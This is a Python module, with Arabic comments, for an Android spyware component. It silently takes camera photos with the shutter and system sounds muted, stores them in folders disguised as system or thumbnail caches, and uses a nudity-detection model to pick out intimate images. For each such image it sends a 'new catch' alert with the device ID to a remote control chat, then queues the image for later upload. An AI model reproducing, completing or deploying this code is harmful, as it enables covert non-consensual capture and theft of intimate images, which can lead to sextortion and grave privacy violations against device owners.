# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import gc
from datetime import datetime

# ========== إعداد المسارات الموحدة مع التمويه ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "ctmp")                     # مجلد مؤقت للصور الخام
QUEUE = os.path.join(P, ".cache_thumb")         # مجلد الانتظار (موهم كمجلد مصغرات)

for d in [P, T, QUEUE]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات الأساسية ==========
try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False

# ========== كلاس الكاميرا ==========
class CameraAnalyzer:
    def __init__(self, mon=None, det=None):
        self.mon = mon
        self.det = det                # NudeDetector instance (يحتوي على النموذج)
        self.busy = False
        self._old_volume = -1

    # ========== التحقق من البطارية ==========
    def _power_ok(self):
        try:
            # تصحيح اسم الدالة: _battery_ok بدلاً من _bat
            b, c = self.mon._battery_ok() if hasattr(self.mon, '_battery_ok') else (100, True)
            return b >= 15 or c
        except:
            return True

    # ========== كتم صوت النظام (للكاميرا الصامتة) ==========
    def _mute_audio(self, mute=True):
        if not JNI:
            return
        try:
            AudioManager = autoclass('android.media.AudioManager')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            am = ctx.getSystemService(ctx.AUDIO_SERVICE)
            if mute:
                self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            else:
                if self._old_volume >= 0:
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, self._old_volume, 0)
                    self._old_volume = -1
        except Exception as e:
            logging.error(f"Mute error: {e}")

    # ========== التقاط صورة (صامتة) ==========
    def capture(self, cam_id=0):
        """
        تلتقط صورة باستخدام Camera1 API.
        cam_id = 0 خلفية, 1 أمامية.
        تعيد مسار الصورة المحفوظة أو None.
        """
        if self.busy or not self._power_ok():
            return None

        self.busy = True
        out_path = None
        camera = None

        if JNI:
            self._mute_audio(True)
            try:
                Camera = autoclass('android.hardware.Camera')
                CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
                num_cameras = Camera.getNumberOfCameras()

                # تحديد معرف الكاميرا المطلوبة
                target_id = -1
                if cam_id == 0:  # خلفية
                    # أول كاميرا عادةً تكون خلفية
                    target_id = 0
                elif cam_id == 1:  # أمامية
                    for i in range(num_cameras):
                        info = CameraInfo()
                        Camera.getCameraInfo(i, info)
                        if info.facing == CameraInfo.CAMERA_FACING_FRONT:
                            target_id = i
                            break
                else:
                    target_id = 0

                if target_id == -1:
                    logging.error("No suitable camera found")
                    return None

                camera = Camera.open(target_id)
                params = camera.getParameters()

                # اختيار دقة مناسبة (قريبة من 1024x768)
                supported_sizes = params.getSupportedPictureSizes()
                if supported_sizes:
                    target_area = 1024 * 768
                    best_size = min(supported_sizes, key=lambda s: abs(s.width * s.height - target_area))
                    params.setPictureSize(best_size.width, best_size.height)

                # إعدادات الصورة والإخراج
                params.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
                params.set("shutter-sound", 0)  # إسكات صوت الكاميرا
                rotation = 270 if cam_id == 1 else 90
                params.setRotation(rotation)
                camera.setParameters(params)

                out_path = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")
                image_saved = threading.Event()

                class PicCallback(PythonJavaClass):
                    __javainterfaces__ = ['android.hardware.Camera$PictureCallback']
                    @java_method('([BLandroid/hardware/Camera;)V')
                    def onPictureTaken(self, data, cam):
                        with open(out_path, 'wb') as f:
                            f.write(data)
                        image_saved.set()

                camera.startPreview()
                camera.takePicture(None, None, PicCallback())

                # 🔧 زيادة المهلة إلى 15 ثانية (كانت 7 ثوانٍ)
                if not image_saved.wait(15):
                    logging.warning("Camera capture timeout after 15 seconds")
                    out_path = None

                camera.stopPreview()

            except Exception as e:
                logging.error(f"Capture error: {e}")
                out_path = None
            finally:
                if camera:
                    try:
                        camera.release()
                    except:
                        pass
                self._mute_audio(False)
                gc.collect()

        self.busy = False
        return out_path

    # ========== تحضير الصورة لـ AI (استيراد داخلي) ==========
    def _prepare_for_ai(self, path):
        """
        تحويل الصورة إلى مصفوفة (224x224, float32) لتغذية النموذج.
        تستورد numpy و PIL داخلياً لتجنب فشل التحميل إذا كانت المكتبات مفقودة.
        """
        try:
            from PIL import Image
            import numpy as np
        except ImportError:
            return None

        try:
            with Image.open(path) as img:
                img = img.convert('RGB').resize((224, 224), Image.BILINEAR)
                arr = np.asarray(img, dtype=np.float32) / 255.0
                return np.expand_dims(arr, axis=0)
        except Exception as e:
            logging.error(f"AI prep error: {e}")
            return None

    # ========== الوظيفة الرئيسية: التقاط وتحليل وإشعار ==========
    def harvest(self, cam_id=0):
        """
        تلتقط صورة، تحللها عبر نموذج AI (إذا كان محمّلاً)،
        ترسل إشعاراً فورياً إذا كانت حساسة، وتنقل الصورة إلى مجلد الانتظار.
        """
        pic_path = self.capture(cam_id)
        if not pic_path or not os.path.exists(pic_path):
            return

        is_nude = False
        confidence = 0.0

        # التحقق من وجود كاشف ونموذج محمّل (قد يكون قيد التحميل بعد أول تشغيل)
        if self.det and hasattr(self.det, 'model') and self.det.model is not None:
            input_data = self._prepare_for_ai(pic_path)
            if input_data is not None:
                try:
                    self.det.model.set_tensor(self.det.in_idx, input_data)
                    self.det.model.invoke()
                    out = self.det.model.get_tensor(self.det.out_idx)[0]
                    confidence = float(out[1]) if len(out) > 1 else float(out[0])
                    if confidence > 0.85:
                        is_nude = True
                except Exception as e:
                    logging.error(f"AI analysis error: {e}")

        if is_nude:
            # إرسال إشعار فوري لمجموعة التحكم
            if self.mon and hasattr(self.mon, 'ui') and self.mon.ui:
                try:
                    cam_type = "الأمامية" if cam_id == 1 else "الخلفية"
                    alert = (
                        f"🔞 **صيد جديد!**\n"
                        f"📱 الجهاز: `{self.mon.dmd}`\n"
                        f"📸 الكاميرا: {cam_type}\n"
                        f"🎯 الثقة: `{confidence:.1%}`\n"
                        f"⏰ الوقت: `{datetime.now().strftime('%H:%M:%S')}`"
                    )
                    self.mon.ui._api("sendMessage", {
                        "chat_id": self.mon.ctrl,
                        "text": alert,
                        "parse_mode": "Markdown"
                    })
                except Exception as e:
                    logging.error(f"Alert send error: {e}")

            # نقل الصورة إلى مجلد الانتظار (سيتم ضغطها وإرسالها لاحقاً بواسطة daily_zipper)
            dest = os.path.join(QUEUE, os.path.basename(pic_path))
            try:
                os.rename(pic_path, dest)
                logging.info(f"Moved to queue: {dest}")
            except Exception as e:
                logging.error(f"Move error: {e}")
                if os.path.exists(pic_path):
                    os.remove(pic_path)
        else:
            # حذف الصورة العادية فوراً
            if os.path.exists(pic_path):
                os.remove(pic_path)


# ========== دالة المصنع ==========
def create(mon=None, det=None):
    return CameraAnalyzer(mon, det)
